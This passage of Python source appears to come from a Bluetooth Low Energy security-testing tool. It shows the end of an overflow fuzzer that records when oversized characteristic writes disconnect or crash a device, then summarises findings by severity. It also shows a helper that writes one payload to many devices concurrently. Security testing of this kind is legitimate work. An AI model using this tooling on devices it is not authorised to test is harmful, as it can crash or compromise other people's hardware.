                size=disc_size, outcome="disconnect",
                severity=sev, detail=detail, raw_error=disc_err,
                crashed=crashed,
            ))
            marker = "[ CRASH!! ]" if crashed else "[ DISC    ]"
            _log(f"[OVERFLOW]   {disc_size:>4}B  {marker} {detail}")
            if crashed:
                abort = True

    # ── Summary ──────────────────────────────────────────────────────────────
    _log(f"[OVERFLOW] ─────────────────────────────────────────────")
    by_sev = {}
    for f in findings:
        by_sev.setdefault(f.severity, []).append(f)
    counts = "  ".join(
        f"{sev}={len(by_sev[sev])}"
        for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO")
        if sev in by_sev
    )
    _log(f"[OVERFLOW] {len(findings)} finding(s)  |  {counts}")

    important = sorted(
        [f for f in findings if f.severity in ("CRITICAL", "HIGH", "MEDIUM")],
        key=lambda f: (_SEVERITY_RANK[f.severity], f.size),
    )
    for f in important:
        crash_note = " ← DEVICE CRASHED" if f.crashed else ""
        _log(f"[OVERFLOW]   [{f.severity}] {f.char_uuid}  {f.size}B  {f.detail}{crash_note}")

    return findings


async def batch_write(
    devices: list[BTDevice],
    payload: Payload,
    delay: float = 0.0,
) -> dict[str, WriteResult]:
    """Write the same payload to multiple devices concurrently.

    If delay > 0, task creation is staggered by that many seconds to avoid
    hammering the BLE adapter with simultaneous connection attempts.
    """
    async def _run(dev: BTDevice) -> tuple[str, WriteResult]:
        return dev.mac, await run_payload(dev, payload)

    if delay:
        scheduled = []
        for dev in devices:
            scheduled.append(asyncio.create_task(_run(dev)))
            await asyncio.sleep(delay)
        pairs = await asyncio.gather(*scheduled)
    else:
        pairs = await asyncio.gather(*(_run(dev) for dev in devices))

    return dict(pairs)
